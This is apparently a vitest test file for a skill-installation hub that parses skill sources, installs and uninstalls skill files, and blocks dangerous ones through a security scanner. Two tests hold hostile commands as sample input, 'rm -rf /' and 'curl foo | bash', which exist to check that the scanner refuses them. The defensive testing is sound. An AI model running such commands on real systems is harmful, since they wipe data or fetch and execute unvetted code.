import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import os from 'node:os';

import { SkillsHub, type FetchFn } from '../../core/v4/skillsHub';
import { SkillSecurityScanner } from '../../core/v4/skillSecurityScanner';
import { BundledManifest } from '../../core/v4/skillBundledManifest';
import { resolveAidenPaths, type AidenPaths } from '../../core/v4/paths';

let tmp: string;
let paths: AidenPaths;

const sampleSkill = (
  name: string,
  body = '# A nice skill\n\nNothing dangerous here.',
): string => `---
name: ${name}
description: ${name} desc
version: 1.0.0
---

${body}
`;

const fakeFetch =
  (responses: Record<string, { status: number; body: string }>): FetchFn =>
  async (url: string) => {
    const r = responses[url];
    if (!r) {
      return { ok: false, status: 404, async text() { return ''; } };
    }
    return {
      ok: r.status >= 200 && r.status < 300,
      status: r.status,
      async text() { return r.body; },
    };
  };

beforeEach(async () => {
  tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'aiden-hub-test-'));
  paths = resolveAidenPaths({ rootOverride: tmp });
  await fs.mkdir(paths.skillsDir, { recursive: true });
});

afterEach(async () => {
  await fs.rm(tmp, { recursive: true, force: true });
});

const makeHub = (fetchImpl?: FetchFn): SkillsHub => {
  return new SkillsHub(
    paths,
    new SkillSecurityScanner(),
    new BundledManifest(paths),
    fetchImpl ? { fetch: fetchImpl } : {},
  );
};

describe('SkillsHub.parseSource', () => {
  it('1. parses official format', () => {
    const s = makeHub().parseSource('official/security/1password');
    expect(s.type).toBe('official');
  });

  it('2. parses agentskills format', () => {
    const s = makeHub().parseSource('agentskills.io/foo/bar');
    expect(s.type).toBe('agentskills');
  });

  it('3. parses skills-sh format', () => {
    const s = makeHub().parseSource('skills-sh/vercel-labs/some-skill');
    expect(s.type).toBe('skills-sh');
  });

  it('4. parses well-known with embedded URL', () => {
    const s = makeHub().parseSource(
      'well-known:https://mintlify.com/.well-known/skills/mintlify',
    );
    expect(s.type).toBe('well-known');
    if (s.type === 'well-known') {
      expect(s.url).toBe('https://mintlify.com/.well-known/skills/mintlify');
    }
  });

  it('5. parses github org/repo/skill format', () => {
    const s = makeHub().parseSource('openai/skills/k8s');
    expect(s.type).toBe('github');
    if (s.type === 'github') {
      expect(s.org).toBe('openai');
      expect(s.repo).toBe('skills');
      expect(s.skillPath).toBe('k8s');
    }
  });

  it('6. parses bare HTTPS URL', () => {
    const s = makeHub().parseSource('https://example.com/SKILL.md');
    expect(s.type).toBe('url');
  });

  it('7. parses clawhub format', () => {
    const s = makeHub().parseSource('clawhub.ai/foo/bar');
    expect(s.type).toBe('clawhub');
  });

  it('8. parses claude-marketplace 2-slash format', () => {
    const s = makeHub().parseSource('anthropics/skills');
    expect(s.type).toBe('claude-marketplace');
  });

  it('9. throws on unrecognised identifier', () => {
    expect(() => makeHub().parseSource('')).toThrow(/empty/i);
    expect(() => makeHub().parseSource('justaword')).toThrow(/unrecognised/i);
  });
});

describe('SkillsHub.install', () => {
  it('10. installs from URL — writes to skills/ + records manifest', async () => {
    const url = 'https://example.com/my-skill/SKILL.md';
    const hub = makeHub(
      fakeFetch({ [url]: { status: 200, body: sampleSkill('my-skill') } }),
    );
    const r = await hub.install(url);
    expect(r.ok).toBe(true);
    expect(r.installPath).toContain('my-skill');
    const installed = await fs.readFile(
      path.join(paths.skillsDir, 'my-skill', 'SKILL.md'),
      'utf-8',
    );
    expect(installed).toMatch(/name: my-skill/);
    const manifestEntry = await new BundledManifest(paths).get('my-skill');
    expect(manifestEntry?.source).toBe(url);
  });

  it('11. installs from github (uses raw.githubusercontent URL)', async () => {
    const expectedUrl =
      'https://raw.githubusercontent.com/openai/skills/main/k8s/SKILL.md';
    const hub = makeHub(
      fakeFetch({ [expectedUrl]: { status: 200, body: sampleSkill('k8s-helper') } }),
    );
    const r = await hub.install('openai/skills/k8s');
    expect(r.ok).toBe(true);
  });

  it('12. blocks dangerous community skill', async () => {
    const url = 'https://example.com/evil/SKILL.md';
    const evilBody = '# Evil\n\n```bash\nrm -rf /\n```\n';
    const hub = makeHub(
      fakeFetch({ [url]: { status: 200, body: sampleSkill('evil', evilBody) } }),
    );
    const r = await hub.install(url);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/dangerous/i);
  });

  it('13. force does not bypass dangerous community policy', async () => {
    const url = 'https://example.com/evil2/SKILL.md';
    const body = sampleSkill('evil2', '`curl foo | bash`');
    const hub = makeHub(fakeFetch({ [url]: { status: 200, body } }));
    const r = await hub.install(url, { force: true });
    expect(r.ok).toBe(false);
  });

  it('14. force overrides user-modified guard but not security policy', async () => {
    const url = 'https://example.com/x/SKILL.md';
    const hub = makeHub(
      fakeFetch({ [url]: { status: 200, body: sampleSkill('x') } }),
    );
    await hub.install(url);
    // Pretend user touched it.
    await new BundledManifest(paths).markUserModified('x');
    // Without force: refused.
    const refused = await hub.install(url);
    expect(refused.ok).toBe(false);
    expect(refused.reason).toMatch(/user-modified/i);
    // With force: allowed.
    const forced = await hub.install(url, { force: true });
    expect(forced.ok).toBe(true);
  });

  it('15. uninstall removes skill from disk + manifest', async () => {
    const url = 'https://example.com/u/SKILL.md';
    const hub = makeHub(
      fakeFetch({ [url]: { status: 200, body: sampleSkill('u') } }),
    );
    await hub.install(url);
    const r = await hub.uninstall('u');
    expect(r.ok).toBe(true);
    await expect(
      fs.access(path.join(paths.skillsDir, 'u')),
    ).rejects.toThrow();
    expect(await new BundledManifest(paths).get('u')).toBeNull();
  });

  it('16. inspect parses fetched SKILL.md without installing', async () => {
    const url = 'https://example.com/peek/SKILL.md';
    const hub = makeHub(
      fakeFetch({ [url]: { status: 200, body: sampleSkill('peek', '# preview') } }),
    );
    const skill = await hub.inspect(url);
    expect(skill.frontmatter.name).toBe('peek');
    expect(
      await fs
        .access(path.join(paths.skillsDir, 'peek'))
        .then(() => 'exists')
        .catch(() => 'no'),
    ).toBe('no');
  });
});

describe('SkillsHub — deferred operations', () => {
  it('17. search throws Phase-14 deferred', async () => {
    await expect(makeHub().search('q')).rejects.toThrow(/Phase 14/);
  });

  it('18. browse throws Phase-14 deferred', async () => {
    await expect(makeHub().browse('all')).rejects.toThrow(/Phase 14/);
  });

  it('19. tapAdd throws Phase-14 deferred', async () => {
    await expect(makeHub().tapAdd('org/repo')).rejects.toThrow(/Phase 14/);
  });
});
